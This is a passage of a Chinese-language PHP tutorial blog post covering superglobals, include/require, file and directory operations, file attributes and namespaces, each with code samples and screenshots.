一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</li><li>$_SERVER　　一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组</li><li>$_REQUEST　　用于收集HTML表单提交的数据。它可以获取 cookie  get  post </li><li>$_POST　　广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。</li><li>$_GET　　广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。</li><li>$_FILES　　</li><li>$_ENV　　</li><li>$_COOKIE　　</li><li>$_SESSION</li></ul><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php // php预定义方法echo "\n", $GLOBALS['y'];echo "\n", $_SERVER['PHP_SELF'];echo "\n", $_SERVER['SERVER_NAME'];echo "\n", $_SERVER['HTTP_HOST'];?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210711122846467.png" alt="image-20210711122846467"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sub<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210711123337412.png" alt="image-20210711123337412"></p><h2 id="php文件"><a href="#php文件" class="headerlink" title="php文件"></a>php文件</h2><h3 id="include文件操作"><a href="#include文件操作" class="headerlink" title="include文件操作"></a>include文件操作</h3><p>服务器端包含 (SSI) 用于创建可在多个页面重复使用的函数、页眉、页脚或元素。</p><p>include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。</p><blockquote><p>PHP include 和 require 语句</p><p>通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。</p><p>include 和 require 语句是相同的，除了错误处理方面：</p><p>require 会生成致命错误（E_COMPILE_ERROR）并停止脚本</p><p>include 只生成警告（E_WARNING），并且脚本会继续</p><p>因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性，在某个关键文件意外丢失的情况下。</p><p>包含文件省去了大量的工作。这意味着您可以为所有页面创建标准页头、页脚或者菜单文件。然后，在页头需要更新时，您只需更新这个页头包含文件即可。</p></blockquote><p>function.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问index，调用了function</p><p><img src="/2021/07/08/60-zhi-day4/image-20210711123208709.png" alt="image-20210711123208709"></p><p>include header和footer同，不演示例子了</p><h3 id="php操作文件"><a href="#php操作文件" class="headerlink" title="php操作文件"></a>php操作文件</h3><p>PHP 拥有的多种函数可供创建、读取、上传以及编辑文件。</p><h4 id="PHP-readfile-函数"><a href="#PHP-readfile-函数" class="headerlink" title="PHP readfile() 函数"></a>PHP readfile() 函数</h4><p>readfile() 函数读取文件，并把它写入输出缓冲。</p><h4 id="PHP-Open-File-fopen"><a href="#PHP-Open-File-fopen" class="headerlink" title="PHP Open File - fopen()"></a>PHP Open File - fopen()</h4><p>打开文件的更好的方法是通过 fopen() 函数。此函数为您提供比 readfile() 函数更多的选项。</p><p>fopen() 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。</p><p>模式：</p><p><img src="/2021/07/08/60-zhi-day4/image-20210711123721533.png" alt="image-20210711123721533"></p><h4 id="PHP-读取文件-fread"><a href="#PHP-读取文件-fread" class="headerlink" title="PHP 读取文件 - fread()"></a>PHP 读取文件 - fread()</h4><p>fread() 函数读取打开的文件。</p><p>fread() 的第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数。</p><h4 id="PHP-关闭文件-fclose"><a href="#PHP-关闭文件-fclose" class="headerlink" title="PHP 关闭文件 - fclose()"></a>PHP 关闭文件 - fclose()</h4><p>fclose() 函数用于关闭打开的文件。</p><p>注释：用完文件后把它们全部关闭是一个良好的编程习惯。您并不想打开的文件占用您的服务器资源。</p><p>fclose() 需要待关闭文件的名称（或者存有文件名的变量）</p><h4 id="PHP-读取单行文件-fgets"><a href="#PHP-读取单行文件-fgets" class="headerlink" title="PHP 读取单行文件 - fgets()"></a>PHP 读取单行文件 - fgets()</h4><p>fgets() 函数用于从文件读取单行。</p><p>调用 fgets() 函数之后，文件指针会移动到下一行。</p><h4 id="PHP-检查-End-Of-File-feof"><a href="#PHP-检查-End-Of-File-feof" class="headerlink" title="PHP 检查 End-Of-File - feof()"></a>PHP 检查 End-Of-File - feof()</h4><p>feof() 函数检查是否已到达 “end-of-file” (EOF)。</p><p>feof() 对于遍历未知长度的数据很有用。</p><p>feof() 函数检查是否已到达文件末尾(EOF)</p><h4 id="PHP-读取单字符-fgetc"><a href="#PHP-读取单字符-fgetc" class="headerlink" title="PHP 读取单字符 - fgetc()"></a>PHP 读取单字符 - fgetc()</h4><p>fgetc() 函数用于从文件中读取单个字符</p><h4 id="PHP-创建文件-fopen"><a href="#PHP-创建文件-fopen" class="headerlink" title="PHP 创建文件 - fopen()"></a>PHP 创建文件 - fopen()</h4><p>fopen() 函数也用于创建文件。在php中创建文件与打开文件所用函数相同</p><h4 id="PHP-写入文件-fwrite"><a href="#PHP-写入文件-fwrite" class="headerlink" title="PHP 写入文件 - fwrite()"></a>PHP 写入文件 - fwrite()</h4><p>fwrite() 函数用于写入文件。</p><p>fwrite() 的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串。</p><h4 id="php覆盖-Overwriting"><a href="#php覆盖-Overwriting" class="headerlink" title="php覆盖(Overwriting)"></a>php覆盖(Overwriting)</h4><p>如果现在 “newfile.txt” 包含了一些数据，我们可以展示在写入已有文件时发生的的事情。所有已存在的数据会被擦除并以一个新文件开始。</p><h3 id="文件的复制-删除-重命名"><a href="#文件的复制-删除-重命名" class="headerlink" title="文件的复制  删除  重命名"></a>文件的复制  删除  重命名</h3><p>php文件重命名：函数rename()。</p><p>php文件复制：函数copy();</p><p>php文件删除：函数unlink();</p><h3 id="文件的判断"><a href="#文件的判断" class="headerlink" title="文件的判断"></a>文件的判断</h3><p>file_exists() 判断文件是否存在</p><p>is_file() 是否为文件。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*读取文件 * $myfile= fopen('12306top100.txt','r');var_dump($myfile);echo fread($myfile,filesize('12306top100.txt'));fclose($myfile);*/</span><span class="token comment">/*读取文件 * $myfile= fopen('12306top100.txt','r');//echo fgets($myfile);//echo fgets($myfile);//echo fgets($myfile);while (!feof($myfile)){//检查是否已到达末尾    echo md5(fgets($myfile))."&lt;br&gt;";}*/</span><span class="token comment">/*//创建文件 写入内容$myfile = fopen('1.txt','a');//w模式 写 如果文件不存在创建文件  a模式 在原有的基础上增加内容，如果文件不存在同样会创建文件fwrite($myfile,"bbbb \r\n");fclose($myfile);//关闭文件*/</span><span class="token comment">//重命名</span><span class="token comment">//rename('1.txt','1-1.txt');</span><span class="token comment">//复制</span><span class="token comment">//copy('1.txt','2.txt');</span>    <span class="token comment">//将1.txt复制到2.txt，如果2.txt不存在 则创建后复制</span><span class="token comment">/*//删除文件unlink('1.txt');*/</span><span class="token comment">/*if(file_exists('2.txt')){    echo "文件存在";}else{    echo "文件不存在";}*/</span><span class="token comment">//判断是否是文件</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"是文件"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"不是文件"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="php获取文件属性"><a href="#php获取文件属性" class="headerlink" title="php获取文件属性"></a>php获取文件属性</h2><p>当我们在程序中操作文件时，可能会使用到文件的一些常见属性，比如文件的大小、类型、修改时间、访问时间以及权限等等。</p><p>PHP 中提供了非常全面的用来获取这些属性的内置函数，如下</p><p><img src="/2021/07/08/60-zhi-day4/image-20210711142200617.png" alt="image-20210711142200617"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span><span class="token operator">=</span><span class="token string double-quoted-string">"1.txt"</span><span class="token punctuation">;</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"文件不存在&lt;br&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//or前  如果存在后不会执行or后   如果存在就会执行</span><span class="token keyword">echo</span> <span class="token variable">$myfile</span><span class="token operator">.</span><span class="token string double-quoted-string">"存在"</span><span class="token operator">.</span><span class="token string double-quoted-string">"大小为"</span><span class="token operator">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"kb&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//判断是否可读</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_readable</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件可读&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件不可读&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//判断是否可执行</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_executable</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件可执行&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件不可执行&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//判断是否可写</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件可写&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件不可写&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//获取文件创建时间</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件创建时间为"</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span><span class="token function">filectime</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//获取文件修改时间</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件修改时间为"</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span><span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//获取文件上次访问时间</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件访问时间为"</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span><span class="token function">fileatime</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210711142249854.png" alt="image-20210711142249854"></p><h2 id="php目录操作"><a href="#php目录操作" class="headerlink" title="php目录操作"></a>php目录操作</h2><ul><li><p>新建目录：mkdir(路径，权限，递归创建)</p></li><li><p>删除目录：rmdir()</p></li><li><p>移动（改名）：rename()</p></li><li><p>获取目录内容：</p><p>//打开目录</p><p>目录句柄 = opendir()</p></li><li><p>//读取目录</p><p>文件名 = readdir(目录句柄)</p><p>依次读取文件名，同时向下移动文件句柄指针，读取不到则返回false</p></li><li><p>//关闭目录</p><p>closedir() </p></li><li><p>当前目录. 上级目录用..</p></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*$name="myhack";//mkdir($name);//新建名为name的目录//rename($name,'晓莎K');//更改目录的名字rmdir('晓莎K');//删除目录*/</span><span class="token comment">/*//遍历目录$path=".";//当前路径$dh= opendir($path);//打开目录//读取打开目录的文件名，没有文件m//echo readdir($dh);//依次读取文件名，同时向下移动文件句柄指针，读取不到则返回false//echo readdir($dh);//echo readdir($dh);//输出目录和文件名while(($file=readdir($dh))!==false){    if(is_dir($file)&amp;&amp; $file!="." &amp;&amp; $file!=".."){        echo "目录 $file"."&lt;br&gt;";    }else{        if ($file!="." &amp;&amp; $file!=".."){            echo "文件 $file"."&lt;br&gt;";        }    }}*/</span><span class="token comment">/*//我们直接输出时发现输出的全是文件,即使是目录他也是显示文件，所以我们需要使用绝对路径$dirpath$path="c:/";//c盘路径$dh= opendir($path);//输出目录和文件名while(($file=readdir($dh))!==false){    $dirpath="$path$file";    if(is_dir($dirpath)&amp;&amp; $file!="." &amp;&amp; $file!=".."){        echo "目录 $dirpath"."&lt;br&gt;";    }else{        if ($dirpath!="." &amp;&amp; $dirpath!=".."){            echo "文件 $dirpath"."&lt;br&gt;";        }    }}*/</span><span class="token comment">//遍历c盘目录  如果是目录 继续遍历 如果是文件输出  相当于是递归操作了</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"e:/"</span><span class="token punctuation">;</span><span class="token comment">//x盘路径</span><span class="token keyword">function</span> <span class="token function-definition function">tree</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$dh</span><span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开目录</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$dh</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//当目录打开时</span>        <span class="token variable">$dirpath</span><span class="token operator">=</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$path</span></span><span class="token interpolation"><span class="token variable">$file</span></span>"</span><span class="token punctuation">;</span><span class="token comment">//绝对路径</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dirpath</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">!=</span><span class="token string double-quoted-string">"."</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">!=</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//绝对路径是目录且打开目录不是相对路径</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"目录 <span class="token interpolation"><span class="token variable">$dirpath</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_readable</span><span class="token punctuation">(</span><span class="token variable">$dirpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//有访问权限</span>                <span class="token function">tree</span><span class="token punctuation">(</span><span class="token variable">$dirpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//继续遍历目录</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"无权限访问"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment">//不是目录</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string double-quoted-string">"."</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">!=</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//打开目录不是相对路径</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件 <span class="token interpolation"><span class="token variable">$dirpath</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//输出文件</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$dh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭目录  减少资源占用</span><span class="token punctuation">}</span><span class="token function">tree</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用函数 函数在加载页面是不会执行 只有在调用时才会执行</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210711142640979.png" alt="image-20210711142640979"></p><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><blockquote><p>命名空间可以解决以下俩类问题：</p><p>用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。</p><p>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，以提高源代码的可读性。</p></blockquote><p>命名空间（可以理解为创建文件夹）</p><ul><li>定义：命名空间namespace，是指人为的将内存进行分隔，让不同内存区域的同名结构共存，从而解决在大型项目中可能出现的重名结构的问题</li><li>语法：namespace 空间名</li><li>作用：不同的空间可以有同名的结构，如：类</li><li>空间元素：函数，常量，类，不包括变量！！</li></ul><p>子空间（子文件夹）</p><ul><li><p>定义：命名空间内部再划分一个命名空间，让每个小空间独立起来</p></li><li><p>语法:</p><p>​           namespace 空间名</p><p>​           namespace 空间名\子空间</p></li></ul><p>命名空间访问</p><p>非限定名称访问：直接访问空间元素的名字（只访问自己命名空间的元素）</p><p>限定名称访问：使用自己当前的子空间名字+ \ + 元素名字</p><p>完全限定名称访问：\ + 全局空间 + \  +  元素名字</p><p>demo3/demo1.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">const</span> <span class="token constant">NAME</span><span class="token operator">=</span><span class="token string single-quoted-string">'晓莎K'</span><span class="token punctuation">;</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">'aaaa'</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'demo2.php'</span><span class="token punctuation">;</span><span class="token comment">//变量被覆盖  常量未被覆盖</span><span class="token keyword">echo</span> <span class="token constant">NAME</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo3/demo2.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">const</span> <span class="token constant">NAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'晓莎K2'</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'bbbb'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712110512032.png" alt="image-20210712110512032"></p><p>demo3/demo3.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">mydemo</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'demo4.php'</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">NAME</span><span class="token operator">=</span><span class="token string single-quoted-string">'K_a'</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string single-quoted-string">'getName-a'</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Dog</span><span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Dog_a'</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token constant">NAME</span><span class="token punctuation">;</span><span class="token comment">//非限定名称 本空间名访问</span><span class="token keyword">echo</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//非限定名称 本空间名访问</span><span class="token keyword">echo</span> <span class="token class-name static-context">Dog</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//非限定名称 本空间名访问</span><span class="token keyword">echo</span> b\<span class="token constant">NAME</span><span class="token punctuation">;</span><span class="token comment">//限定名称  子空间名\元素</span><span class="token keyword">echo</span> <span class="token function">b<span class="token punctuation">\</span>getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//限定名称 子空间名\元素</span><span class="token keyword">echo</span> <span class="token class-name class-name-fully-qualified static-context">b<span class="token punctuation">\</span>Dog</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//限定名称 子空间名\元素</span><span class="token comment">//完全限定名称</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;hr&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> \mydemo\<span class="token constant">NAME</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function"><span class="token punctuation">\</span>mydemo<span class="token punctuation">\</span>getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>mydemo<span class="token punctuation">\</span>Dog</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> \mydemo\b\<span class="token constant">NAME</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function"><span class="token punctuation">\</span>mydemo<span class="token punctuation">\</span>b<span class="token punctuation">\</span>getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>mydemo<span class="token punctuation">\</span>b<span class="token punctuation">\</span>Dog</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo3/demo4.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">mydemo<span class="token punctuation">\</span>b</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">NAME</span><span class="token operator">=</span><span class="token string single-quoted-string">'K_b'</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string single-quoted-string">'getName-b'</span><span class="token operator">.</span><span 